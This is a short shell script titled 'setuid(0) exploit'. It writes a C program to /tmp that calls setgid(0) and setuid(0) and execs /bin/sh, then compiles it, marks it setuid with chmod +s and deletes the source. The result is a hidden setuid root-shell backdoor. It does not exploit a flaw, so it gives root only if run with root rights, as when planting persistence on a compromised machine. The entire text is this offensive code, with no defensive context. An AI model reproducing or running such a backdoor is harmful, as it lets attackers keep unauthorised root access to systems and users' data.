#!/bin/sh

######################
# setuid(0) exploit
######################

>  /tmp/su.$$.c echo '#include <sys/types.h>'
>> /tmp/su.$$.c echo '#include <unistd.h>'
>> /tmp/su.$$.c echo 'int main() { setgid(0); setuid(0); execl("/bin/sh", "sh", 0); return 0; }'

gcc -o /tmp/su.$$ /tmp/su.$$.c && chmod +s /tmp/su.$$ && rm /tmp/su.$$.c
